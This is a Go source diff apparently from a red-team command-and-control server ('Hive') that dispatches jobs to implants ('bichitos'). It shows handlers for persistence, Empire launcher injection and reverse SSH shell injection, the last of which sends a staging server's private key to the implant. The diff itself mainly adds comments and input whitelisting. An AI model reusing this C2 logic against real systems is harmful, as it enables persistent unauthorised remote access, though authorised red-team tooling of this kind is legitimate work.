 	}else if strings.Contains(jobO.Pid,"R-") && strings.Contains(jobO.Chid,"None"){
 
 		//Fetch params for Jobs that are not related to Hive
@@ -1616,7 +1706,7 @@ func jobProcessor(jobO *Job,queue bool){
 				addLogDB(pid,time,elog)
 		}
 
-	//Jobs that come from users to Footholds	
+	////"Implant Receiving Job Switcher". Jobs that come from users to Footholds	
 	}else if strings.Contains(jobO.Chid,"B-") && !strings.Contains(jobO.Pid,"R-"){
 		
 		var err error
@@ -1638,6 +1728,7 @@ func jobProcessor(jobO *Job,queue bool){
 
 		defer bichitosJobFin()
 
+		//Retrieve the redirector that the bichito is in this moment attached to 
         bichitosjobqueue.Jobs[0].Pid,err = getRidbyBid(bichitosjobqueue.Jobs[0].Chid)
         if err != nil {
             //ErrorLog
@@ -1647,7 +1738,7 @@ func jobProcessor(jobO *Job,queue bool){
             return
         } 
 
-    	//check redundant Jid
+    	//Check redundant Jid
     	errJ := addJobDB(bichitosjobqueue.Jobs[0])
     	if errJ != nil {
         	//ErrorLog
@@ -1657,6 +1748,7 @@ func jobProcessor(jobO *Job,queue bool){
         	return
     	}
 
+    	//Put the job on processing status
    		errS := setJobStatusDB(bichitosjobqueue.Jobs[0].Jid,"Processing")
     	if errS != nil {
         	//ErrorLog
@@ -1667,6 +1759,7 @@ func jobProcessor(jobO *Job,queue bool){
     	}
 
 
+    	//Get data from the first queued Job
 		cid = bichitosjobqueue.Jobs[0].Cid
 		pid = bichitosjobqueue.Jobs[0].Pid
 		chid = bichitosjobqueue.Jobs[0].Chid
@@ -1680,8 +1773,8 @@ func jobProcessor(jobO *Job,queue bool){
 		switch job{
 			
 			////Jobs Triggered by users
-			//Implant Lifecycle
 			
+			//Implant Lifecycle
 			case "respTime":
 				//Lock shared Slice
     			jobsToProcess.mux.Lock()
@@ -1696,7 +1789,14 @@ func jobProcessor(jobO *Job,queue bool){
 				jobsToProcess.mux.Unlock()
 				return
 
-			//Get target Implant and send it for bichito persistence
+			/*
+				Retrieve target Implant and send it for bichito persistence
+				A.Make sure the bichito has checked in
+				B.Get Bichito data
+				C.Retrieve Bichito Sysinfo
+				D.Using the sys. info, target for the right binary to be persisted
+				E.Read the binary,encode the content and put it in the result, the bichito is sent to the queue to be sent back to the Implant
+			*/
 			case "persistence":
 
 				existB,_ := existBiDB(chid)
@@ -1860,6 +1960,12 @@ func jobProcessor(jobO *Job,queue bool){
 
 			
 			//Staging/POST Actions
+
+			/* Generate an Empire launcher using Job data
+				A.Decode Job
+				B.Generate the launcher using staging data
+				C.Send the Job to the Implant with the launcher string within Result
+			*/
 			case "injectEmpire":
 
 				//Get staging
@@ -1872,6 +1978,23 @@ func jobProcessor(jobO *Job,queue bool){
     			if errD != nil {
 					jStatus = setJobStatusDB(jid,"Error")
 					jResult = setJobResultDB(jid,"Implant-injectEmpire(Command JSON Decoding Error)")
+					if (jStatus != nil){
+        				time := time.Now().Format("02/01/2006 15:04:05 MST")
+        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
+        				return
+					}
+					if (jResult != nil){
+        				time := time.Now().Format("02/01/2006 15:04:05 MST")
+        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
+        				return
+					}
+					return
+    			}
+
+    			//White List Staging name
+    			if !namesInputWhite(commandO.Staging){
+					jStatus = setJobStatusDB(jid,"Error")
+					jResult = setJobResultDB(jid,"Hive-injectEmpire(Report "+jobO.Cid+" Incorrect Param. Formatting)")
 					if (jStatus != nil){
         				time := time.Now().Format("02/01/2006 15:04:05 MST")
         				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
@@ -1904,12 +2027,18 @@ func jobProcessor(jobO *Job,queue bool){
     			}
 
 				jobO.Parameters = launcher
-				//Lock shared Slice
     			jobsToProcess.mux.Lock()
     			jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
 				jobsToProcess.mux.Unlock()
 				return
 
+
+			/* Generate an Empire launcher using Job data
+				A.Decode Job
+				B.Get the Domain for the target staging
+				C.Read target staging server pem key
+				D.Encode the em key and the user of the rev. ssh within a Job to be sent back to the Bichito
+			*/
 			case "injectRevSshShell":
 
 				//Get staging
@@ -1934,6 +2063,24 @@ func jobProcessor(jobO *Job,queue bool){
 					}
 					return
     			}
+
+    			if !namesInputWhite(commandO.Staging){
+					jStatus = setJobStatusDB(jid,"Error")
+					jResult = setJobResultDB(jid,"Hive-injectRevSshShell(Staging "+commandO.Staging+" Incorrect Param. Formatting)")
+					if (jStatus != nil){
+        				time := time.Now().Format("02/01/2006 15:04:05 MST")
+        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
+        				return
+					}
+					if (jResult != nil){
+        				time := time.Now().Format("02/01/2006 15:04:05 MST")
+        				go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
+        				return
+					}
+					
+					return
+    			}
+
 
     			domain,err1,err2 := getDomainbyStagingDB(commandO.Staging)
     			if (err1 != nil) || (err2 != nil) {
@@ -1973,9 +2120,6 @@ func jobProcessor(jobO *Job,queue bool){
         			return
     			}
 
-    			//Debug
-    			//fmt.Println("ImplantKey: "+string(sshkey) + "Domain: "+domain)
-
     			//JSON Encode function params 
     			revssshellhparams := InjectRevSshShellBichito{domain,string(sshkey),"22","anonymous"}
 				bufBP := new(bytes.Buffer)
@@ -1995,8 +2139,6 @@ func jobProcessor(jobO *Job,queue bool){
 
 				//Get staging
 				//from staging: type,port,domain
-    			
-				
     			jsconcommanA := make([]InjectRevSshShellBichito, 0)
     			decoder := json.NewDecoder(bytes.NewBufferString(parameters))
     			errD := decoder.Decode(&jsconcommanA)
@@ -2104,14 +2246,17 @@ func jobProcessor(jobO *Job,queue bool){
 				return
 
 			//SYSTEM Jobs
+			//[...]
 
+			//Default if the Job is not implemented
 			default:
 				time := time.Now().Format("02/01/2006 15:04:05 MST")
 				elog := fmt.Sprintf("Job by "+cid+":Bichito(Job not implemented)")
 				addLogDB(pid,time,elog)
 				return
 		}
-
+	
+	//"Implant Receiving Job Switcher".Jobs generated by users towards Implants
 	}else if strings.Contains(jobO.Chid,"B-") && strings.Contains(jobO.Pid,"R-"){
 
 
@@ -2124,43 +2269,8 @@ func jobProcessor(jobO *Job,queue bool){
 		parameters = jobO.Parameters
 
 		switch job{
-			//Deprecated, BiPing can do everything
-			/*
-			case "BiChecking":
 
-   				//BiCHecking is a encoded bot info for future use
-   				biChecking(chid,pid,parameters)
-				jobsreceived := &Job{"","",pid,chid,"received","","","",""}
-				
-				jobsToProcess.mux.Lock()
-				jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobsreceived)
-				jobsToProcess.mux.Unlock()
-
-   				timeA := time.Now().Format("02/01/2006 15:04:05 MST")
-   				errSet1 := setRedLastCheckedDB(pid,timeA)
-   				errSet2 := setBiLastCheckedbyBidDB(chid,timeA)
-   				errSet3 := setBiRidDB(chid,pid)
-   				if (errSet1 != nil){
-       				timeE := time.Now().Format("02/01/2006 15:04:05 MST")
-        			go addLogDB("Hive",timeE,"Error Updating bichito: "+chid+" state because DB error: "+errSet1.Error())
-        			return
-   				}
-   				if (errSet2 != nil){
-       				timeE := time.Now().Format("02/01/2006 15:04:05 MST")
-        			go addLogDB("Hive",timeE,"Error Updating bichito: "+chid+" state because DB error: "+errSet2.Error())
-        			return
-   				}
-   				if (errSet3 != nil){
-       				timeE := time.Now().Format("02/01/2006 15:04:05 MST")
-        			go addLogDB("Hive",timeE,"Error Updating bichito: "+chid+" state because DB error: "+errSet3.Error())
-        			return
-   				}
-
-
-				return
-			*/
-
-			//Main Beacon of Implants, will be used to Update the bot and its redirector
+			//Main Beacon of Implants, will be used to Check-In Bichitos
 			case "BiPing":
 
 				existB,_ := existBiDB(chid)
@@ -2171,7 +2281,6 @@ func jobProcessor(jobO *Job,queue bool){
 				//Check SysInfo, if empty, craft a new Job to retrieve it
 				bichito := getBichitoDB(chid)
 				if (bichito.Info == "") {
-					//fmt.Println("Adding Sysinfo...")
    				
 					jobsysinfo := &Job{"","",pid,chid,"sysinfo","","Processing","",""}
 
@@ -2180,8 +2289,6 @@ func jobProcessor(jobO *Job,queue bool){
 					jobsToProcess.mux.Unlock()
 				}
 
-				//Debug:
-				//fmt.Println("Adding Received...")
 				jobsreceived := &Job{"","",pid,chid,"received","","","",""}
 
 				jobsToProcess.mux.Lock()
@@ -2209,6 +2316,7 @@ func jobProcessor(jobO *Job,queue bool){
    				}
 
 				return
+
 
 			case "sysinfo":
         		err1 := setBiInfoDB(chid,result)
@@ -2353,6 +2461,13 @@ func jobProcessor(jobO *Job,queue bool){
 
 				return
 			
+
+			/*
+			If the received Job is not a special one, justand the status of the Bichito(online//offline)
+				A. Update the result of the Implant Job within Hive DB
+				B. Set Redirector and Bichito last checked time to acknowledge if bichito/redirector is offline/online
+				C. Modify the redirector which this Job comes from, so we understand to wich redirector the Online bichito is attached to
+			*/
 			default:
     			//These Bichito jobs are the ones generated by Users, that came back to be updated with results
     			err2 := updateJobDB(jobO)
@@ -2389,7 +2504,7 @@ func jobProcessor(jobO *Job,queue bool){
     			if errRB != nil {
         			//ErrorLog
         			time := time.Now().Format("02/01/2006 15:04:05 MST")
-        			elog := fmt.Sprintf("%s%s","Jobs(Error Setting red: "+jobO.Pid+" to bi: "+jobO.Chid+" to DB):",errRB.Error())
+        			elog := fmt.Sprintf("%s%s","Jobs(Error Setting red: "+jobO.Pid+" to bichito: "+jobO.Chid+" to DB):",errRB.Error())
         			go addLogDB("Hive",time,elog)
         			return
     			}    
@@ -2401,43 +2516,39 @@ func jobProcessor(jobO *Job,queue bool){
 	}
 }
 
+//Following functions are called from JobProcessor. Mostly related to Asset creation and support features.
+
+
+/*
+Description: Receive staging data and Bid and generates a "empire launcher" string that adjust to target OS and egress to prepared staging
+Working just with python, for the moment.
+Flow:
+A. Craft the PATH to the previously generated launcher (on staging creation) using staging name
+B. Read the launcher and return it
+*/
 func getEmpireLauncher(stagingName string,bid string) (string,string){
 
-	//var sysinfo string
-	var outbuf,errbuf bytes.Buffer
 	
-	//TO-DO:get OS for Linux vs Windows
-	//sysinfo = getBiInfoDB(bid)
-	//sysinfoO := jsconcommanA[0]
-
-	//De-serialize paramters
-	//jsconcommanA := make([]SysInfo, 0)
-	//decoder := json.NewDecoder(bytes.NewBufferString(sysinfo))
-	//errD := decoder.Decode(&jsconcommanA)
-	// Error Log
-	//if errD != nil {
-	//	return "Implant-injectEmpire(SysInfo JSON Decoding Error)"+ errD.Error(),""
-	//}
-
-	//TO-DO: Adapt to get it on windows as well
-	//Read Launcher Saved on Empire Staging Creation
 	launchertxtpath := "/usr/local/STHive/stagings/"+stagingName+"/pythonLauncher"
-	
-	cmd_path := "/bin/sh"
-	cmd := exec.Command(cmd_path, "-c","cat "+launchertxtpath)
-	cmd.Stdout = &outbuf
-	cmd.Stderr = &errbuf
-	cmd.Run()
-	cmd.Wait()
-	if errbuf.String() != "" {
-		return "Error Getting Empire Launcher:"+errbuf.String(),""
-	}
 
+    launcher, err := ioutil.ReadFile(launchertxtpath)
+    if err != nil {
+    	time := time.Now().Format("02/01/2006 15:04:05 MST")
+		elog := fmt.Sprintf("Error when trying to read the Empire launcher for staging "+stagingName+":"+err.Error())
+		addLogDB("Hive",time,elog)
+		return "Error",""
+    }	
 
-	return "",outbuf.String()
+	return "",string(launcher)
 
 }
 
+/*
+Description: Perform the Bichito Checking
+Flow:
+A. By bichito ID and Red ID, get the needed information to add a new Bichito to the DB
+B. Set last checked time on the new created bichito
+*/
 func biChecking(chid string,pid string,parameters string){
 
 	redirectorId,_ := getRedIdbyRidDB(pid)
@@ -2450,6 +2561,17 @@ func biChecking(chid string,pid string,parameters string){
 
 }
 
+
+/*
+Description: Main Create Staging Asset Function
+Flow:
+A.Check that the assets provided exist within DB and are available
+B.Create target folder for the staging, crafting the right PATH using provided name
+C.Get a non-used tunnel Port for the Staging-Hive tunneling (Operators never connect directly to stagings but to Hive)
+D.Start routine to generate Staging server with terraform (explained within hvInfra.go)
+E.If the Infra generation was sucessful, continue, if not remove folder
+F.Set a mark within DB for those assets used (like domains), and create the staging within DB
+*/
 func createStaging(stagingName string,stype string,parameters string,vpsName string,domainName string) string{
 
 	var errbuf bytes.Buffer
@@ -2532,6 +2654,14 @@ func createStaging(stagingName string,stype string,parameters string,vpsName str
 
 }
 
+/*
+Description: Main Remove Staging Asset Function
+Flow:
+A.Start the routine to destroy the server with terraform
+B.Remove staging folder
+C.Liberate assets like used domains
+D.Remove staging from DB
+*/
 func removeStaging(stagingName string) string{
 
 	//Remove infra, if sucessful, remove DB row
@@ -2557,6 +2687,16 @@ func removeStaging(stagingName string) string{
 	return "Done"
 }
 
+
+/*
+Description: Function to generate Reports
+Flow:
+A.Get names from the objects related to the report (jobs,implants and stagings)
+B.Start crafting the string to be printed in a file:
+	B1.Jobs from Hive and from Implants
+	B2.Connect to every active staging and retrieve logs
+C.Save string within DB
+*/
 func createReport(reportName string) string{
 
 	var report,implantH string
@@ -2661,8 +2801,6 @@ func createReport(reportName string) string{
 	}
 
 	//Save crafted string on DB
-
-	fmt.Println(report)
 	err = addReportDB(reportName,report)
 	if err != nil {
 		return err.Error()
@@ -2671,6 +2809,14 @@ func createReport(reportName string) string{
 	return ""
 }
 
+
+/*
+Description: Used by createReport, connect to stagings and retrieve logs
+Flow:
+A.Using staging Name get the target domain to connect
+B.Craft the Path to the target staging pem key
+C.SSH connect and retrieve logs
+*/
 func getStagingLog(stagingName string) (string,string){
 
 	//Get Domain
@@ -2692,16 +2838,18 @@ func getStagingLog(stagingName string) (string,string){
 	interactiveS.Start()
 	interactiveS.Wait()
 
-	//if (errbuf.String() != ""){
-	//	return "Error Getting Staging Logs"+errbuf.String(),""
-	//}
 
-	//REsult will be stdout,if stderr return error
+	//Result will be stdout,if stderr return error
 	return "",outbuf.String()
 
 }
 
-
+/*
+Description: Main Function to add Users/Operators
+Flow:
+A.Generate a CID
+B.Add user to DB (password will be hashed)
+*/
 func addUser(username string,password string) (string,string){
 
 	genId := fmt.Sprintf("%s%s","C-",randomString(8))
@@ -2711,61 +2859,3 @@ func addUser(username string,password string) (string,string){
 	}
 	return "",""
 }
-
-
-
-
-
-//// Basic Built-In Server Console
-// 
-
-/*
-func console(){
-
-	var (
-
-		exit bool 			   = false
-		prompt string 		   = "[STConsole]> "
-		scanner *bufio.Scanner = bufio.NewScanner(os.Stdin)
-		)
-		os.Stdout.Write([]byte(prompt))
-
-		// keep scanning input for commands once \n pressed
-		for scanner.Scan() {
-			command := scanner.Text()
-			log.Printf(command)
-			if len(command) > 1 {
-				argv := strings.Split(command, " ") // argument spaces
-				switch argv[0]{
-
-					case "getfingenprint":
-
-						var outbuf,errbuf bytes.Buffer
-						hivSign := exec.Command("/bin/sh","-c", "openssl x509 -fingerprint -sha256 -noout -in /usr/local/STHive/certs/hive.pem | cut -d '=' -f2")
-						hivSign.Stdout = &outbuf
-						hivSign.Stderr = &errbuf
-						hivSign.Start()
-						hivSign.Wait()
-						fmt.Println(strings.Split(outbuf.String(),"\n"))
-
-					case "adduser":
-						if len(argv) < 3 {
-							fmt.Println("Not enough params\n")
-							continue
-						}					
-						fmt.Println(addUser(argv[1],argv[2]))
-
-					case "exit":
-						exit = true
-					default:
-						fmt.Println("help")
-				}
-				if exit {
-					break
-				}
-			}
-			os.Stdout.Write([]byte(prompt))
-		} 
-}
-
-*/
